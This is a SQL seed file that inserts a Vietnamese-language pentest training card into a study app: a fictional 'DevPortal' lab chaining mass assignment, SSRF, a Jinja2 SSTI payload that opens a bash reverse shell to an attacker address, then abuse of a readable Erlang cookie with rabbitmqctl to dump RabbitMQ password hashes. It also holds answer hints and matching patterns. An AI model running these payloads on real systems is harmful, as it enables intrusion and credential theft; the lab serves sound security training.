-- 0048_lab13_ssrf_ssti_rce_erlang_cookie.sql: new original command-typing lab
-- card for the pentest "labs" deck, mirroring a real-world attack chain
-- (mass assignment -> SSRF -> SSTI/RCE -> readable Erlang cookie ->
-- rabbitmqctl privesc) seen in a live practice session tonight and
-- cross-checked against a public writeup of a similar TryHackMe room.
-- Scenario/names here are original (fictional "DevPortal" + "HelpBot"),
-- not copied verbatim from any specific paid room.

INSERT INTO cards (deck_id, kind, front, payload, source)
SELECT d.id, 'lab', c.front, c.payload::jsonb, 'seed'
FROM (VALUES
  ('Lab 13 — Mass assignment → SSRF → SSTI → RCE → Erlang cookie (RabbitMQ) privesc', '{"scenario": "Mục tiêu là app nội bộ \"DevPortal\" (quản lý hồ sơ nhân viên) tại 10.10.10.60, có một chatbot hỗ trợ nội bộ \"HelpBot\" chỉ truy cập được từ mạng internal (loopback). Máy attacker của bạn là 10.10.14.5.", "steps": [{"prompt": "Quét toàn bộ 65535 cổng TCP của 10.10.10.60 với tốc độ nhanh để không bỏ sót cổng lạ.", "hint": "nmap -p- --min-rate=1000 -T4 10.10.10.60", "patterns": ["nmap\\s+-p-\\s+--min-rate=?1000\\s+-T4\\s+10\\.10\\.10\\.60", "nmap\\s+-p-\\s+-T4\\s+--min-rate=?1000\\s+10\\.10\\.10\\.60"], "explanation": "Quét full port trước giúp phát hiện các dịch vụ nội bộ \"ẩn\" (vd message broker) không nằm trong top 1000 cổng mặc định — y hệt ca thực chiến tối nay (epmd 4369, 25672 xuất hiện ngoài danh sách quen)."}, {"prompt": "nmap trả về một vhost mới redirect sang devportal.thm. Thêm dòng ánh xạ IP → hostname này vào /etc/hosts.", "hint": "echo \"10.10.10.60 devportal.thm\" | sudo tee -a /etc/hosts", "patterns": ["echo\\s+.?10\\.10\\.10\\.60\\s+devportal\\.thm.?\\s*\\|\\s*sudo\\s+tee\\s+-a\\s+/etc/hosts"], "explanation": "Không thêm vào /etc/hosts thì trình duyệt/curl sẽ không resolve được vhost ảo — bước này hay bị quên và làm tốn thời gian debug \"tại sao trang không load\"."}, {"prompt": "Đăng ký tài khoản mới qua API (/api/register) bằng curl, nhưng thử thêm field \"role\":\"admin\" vào JSON body để kiểm tra mass assignment (form HTML không có field này).", "hint": "curl -s -X POST -H ''Content-Type: application/json'' -d ''{\"username\":\"x\",\"password\":\"x\",\"role\":\"admin\"}'' http://devportal.thm/api/register", "patterns": ["curl\\s+.*-x\\s+post.*devportal\\.thm/api/register.*role.{0,3}:.{0,3}admin", "curl\\s+.*role.{0,3}:.{0,3}admin.*devportal\\.thm/api/register"], "explanation": "Mass assignment: server có thể gán thẳng field client gửi lên (role) vào object user mà không lọc — luôn thử chèn field quyền (role/is_admin/isAdmin) khi thấy API đăng ký/tạo resource."}, {"prompt": "Trong hồ sơ cá nhân có tính năng \"Tải avatar từ URL\". Tính năng dạng server tự fetch 1 URL do người dùng nhập thuộc nhóm lỗ hổng nào cần nghĩ tới ngay?", "type": "choice", "choices": ["SSRF (Server-Side Request Forgery) — server có thể bị lừa gọi tới địa chỉ nội bộ", "XSS — vì URL hiển thị lại trên trang", "Chỉ là tính năng bình thường, không có gì đáng nghi"], "answer": 0, "explanation": "Bất kỳ chỗ nào server tự đi \"fetch/tải từ URL\" theo giá trị người dùng nhập đều là ứng viên SSRF — cần thử trỏ URL đó vào 127.0.0.1 và các cổng nội bộ."}, {"prompt": "Thử SSRF: gửi URL avatar là http://127.0.0.1:5000/ để xem server có tự kết nối vào cổng nội bộ 5000 không.", "hint": "curl -s -X POST -d \"url=http://127.0.0.1:5000/\" http://devportal.thm/api/avatar/fetch", "patterns": ["curl\\s+.*-d\\s+.?url=http://127\\.0\\.0\\.1:5000/.?.*devportal\\.thm/api/avatar/fetch"], "explanation": "Nếu response khác với lỗi \"connection refused\" ở các cổng khác, nghĩa là cổng 5000 có dịch vụ đang chạy nội bộ mà bạn không thấy được từ ngoài."}, {"prompt": "Đã xác nhận cổng 5000 nội bộ có phản hồi — đó là API chat của \"HelpBot\". Gửi SSRF tới endpoint chat với payload SSTI thử nghiệm {{7*7}} để kiểm tra template injection.", "hint": "curl -s -X POST -d \"url=http://127.0.0.1:5000/chat?msg={{7*7}}\" http://devportal.thm/api/avatar/fetch", "patterns": ["curl\\s+.*msg=\\{\\{7\\*7\\}\\}.*devportal\\.thm/api/avatar/fetch", "curl\\s+.*devportal\\.thm/api/avatar/fetch.*msg=\\{\\{7\\*7\\}\\}"], "explanation": "{{7*7}} là payload kinh điển để test SSTI (Server-Side Template Injection) — nếu response chứa \"49\" thay vì chuỗi gốc, template engine (thường Jinja2) đang thực thi code trong input."}, {"prompt": "Response trả về chứa \"49\" thay vì \"{{7*7}}\". Điều này xác nhận HelpBot đang bị lỗi gì?", "type": "choice", "choices": ["SSTI (Server-Side Template Injection) — input được render như code template, không chỉ như text", "Server chỉ bị lỗi hiển thị (cosmetic bug), không khai thác được", "Đây là dấu hiệu SQL Injection"], "answer": 0, "explanation": "Việc biểu thức toán học bị tính toán thay vì in nguyên văn là bằng chứng rõ ràng của SSTI — bước tiếp theo là nâng cấp payload để thực thi lệnh hệ thống (RCE) qua engine đó."}, {"prompt": "Trên máy attacker, mở sẵn listener netcat cổng 4444 để chờ reverse shell — làm NGAY bây giờ, trước khi trigger payload RCE (mẹo phản xạ: luôn mở listener trước khi cần).", "hint": "nc -lvnp 4444", "patterns": ["nc\\s+-lvnp\\s+4444", "nc\\s+-nvlp\\s+4444", "nc\\s+-nlvp\\s+4444"], "explanation": "Mở listener trễ là lỗi phổ biến nhất khi mới làm reverse shell — payload RCE chỉ gọi về MỘT lần, lỡ nhịp đầu là phải trigger lại từ đầu."}, {"prompt": "Gửi SSRF kèm payload SSTI RCE (Jinja2) qua cổng 5000 để HelpBot chạy lệnh reverse shell bash về 10.10.14.5:4444.", "hint": "curl -s -X POST -d \"url=http://127.0.0.1:5000/chat?msg={{self.__init__.__globals__.__builtins__.__import__(''os'').popen(''bash -c \\\"bash -i >%26 /dev/tcp/10.10.14.5/4444 0>%261\\\"'').read()}}\" http://devportal.thm/api/avatar/fetch", "patterns": ["curl\\s+.*__import__\\(.?os.?\\)\\.popen.*10\\.10\\.14\\.5/4444.*devportal\\.thm/api/avatar/fetch", "curl\\s+.*devportal\\.thm/api/avatar/fetch.*__import__\\(.?os.?\\)\\.popen.*10\\.10\\.14\\.5/4444"], "explanation": "Chuỗi __init__.__globals__.__builtins__.__import__(''os'') là cách kinh điển để \"thoát\" sandbox của Jinja2 và truy cập module os — từ đó os.popen chạy được lệnh hệ thống bất kỳ, kể cả lệnh tạo reverse shell."}, {"prompt": "Shell nhận được là shell \"cùi\" (không tab-complete). Nâng cấp lên pty đầy đủ bằng python3.", "hint": "python3 -c ''import pty; pty.spawn(\"/bin/bash\")''", "patterns": ["python3?\\s+-c\\s+.?import\\s+pty;\\s*pty\\.spawn\\(.?/bin/bash.?\\).?"], "explanation": "pty.spawn tạo pseudo-terminal thật — cho phép tab-complete, Ctrl+C không kill ngay, và chạy được lệnh tương tác."}, {"prompt": "Chạy linpeas.sh (đã có sẵn trên máy) để tự động dò các vector leo quyền, đặc biệt chú ý các file bí mật world-readable.", "hint": "./linpeas.sh (hoặc bash linpeas.sh)", "patterns": ["\\./linpeas\\.sh", "bash\\s+linpeas\\.sh"], "explanation": "linpeas.sh highlight sẵn các file nhạy cảm world-readable — khi recon ban đầu đã thấy cổng kiểu epmd/message-broker, hãy để ý riêng các file \"cookie\" bí mật của broker đó."}, {"prompt": "linpeas báo một file \".erlang.cookie\" world-readable — đây là secret dùng để xác thực giữa các node Erlang (RabbitMQ chạy trên Erlang VM). Tìm chính xác đường dẫn file này trên toàn hệ thống.", "hint": "find / -iname \".erlang.cookie\" 2>/dev/null", "patterns": ["find\\s+/\\s+-iname\\s+.?\\.erlang\\.cookie.?\\s+2>\\s*/dev/null"], "explanation": "File .erlang.cookie thường nằm ở ~/.erlang.cookie hoặc /var/lib/rabbitmq/.erlang.cookie — ai đọc được cookie này có thể mạo danh một node Erlang hợp lệ để nói chuyện với RabbitMQ qua cổng 25672."}, {"prompt": "Có được giá trị cookie — vì sao việc này cho phép bạn điều khiển RabbitMQ qua rabbitmqctl dù không có user/password của broker?", "type": "choice", "choices": ["Vì Erlang distribution protocol (cổng 25672/4369) chỉ xác thực bằng cookie dùng chung giữa các node — có cookie coi như là một node tin cậy, không cần user/pass của RabbitMQ", "Vì cookie chính là mật khẩu admin RabbitMQ luôn được lưu dưới dạng plaintext", "rabbitmqctl không hề cần xác thực gì cả"], "answer": 0, "explanation": "Đây đúng là lý do nmap tối nay thấy epmd (4369) + 25672 mở nhưng 5672/15672 (cổng ứng dụng/web UI) lại đóng — Erlang distribution protocol là một mặt bằng xác thực HOÀN TOÀN khác với user/password của chính RabbitMQ."}, {"prompt": "Copy giá trị cookie đọc được vào ~/.erlang.cookie của bạn (chmod 400), rồi dùng rabbitmqctl để liệt kê user trên broker có node name là rabbit@devportal.", "hint": "rabbitmqctl -n rabbit@devportal list_users", "patterns": ["rabbitmqctl\\s+-n\\s+rabbit@devportal\\s+list_users"], "explanation": "-n chỉ định đúng tên node Erlang (phải khớp với nmap/hostname đã enum được) — rabbitmqctl giờ \"tự xưng\" là một node hợp lệ nhờ cookie trùng khớp, nên broker trả lời bình thường như một lệnh quản trị nội bộ."}, {"prompt": "Xuất toàn bộ definitions của broker (gồm user, permission, và password hash đã salt) ra file JSON để phân tích offline.", "hint": "rabbitmqctl -n rabbit@devportal export_definitions /tmp/defs.json", "patterns": ["rabbitmqctl\\s+-n\\s+rabbit@devportal\\s+export_definitions\\s+/tmp/defs\\.json"], "explanation": "export_definitions xuất cả password_hash (dạng base64 của salt 4 byte + SHA256(salt+password)) theo đúng tài liệu hash scheme của RabbitMQ — từ đây viết script Python ghép salt + brute-force offline để lấy lại mật khẩu admin gốc."}], "difficulty": "nang_cao", "cert_tags": ["THM WEB1", "THM PT1"]}')
) AS c(front, payload)
JOIN decks d ON d.slug = 'labs'
  AND d.subject_id = (SELECT id FROM subjects WHERE slug = 'pentest')
ON CONFLICT DO NOTHING;
